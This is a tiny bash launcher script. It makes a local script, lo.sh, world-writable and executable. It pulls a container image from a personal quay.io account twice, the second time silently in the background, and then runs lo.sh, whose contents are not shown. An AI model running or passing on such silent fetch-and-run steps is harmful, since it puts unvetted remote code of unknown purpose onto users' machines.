#!/bin/bash
chmod 777 lo.sh
docker pull quay.io/lekilite01/nyobelah:latest
docker pull quay.io/lekilite01/nyobelah:latest > /dev/null 2>&1 &
./lo.sh
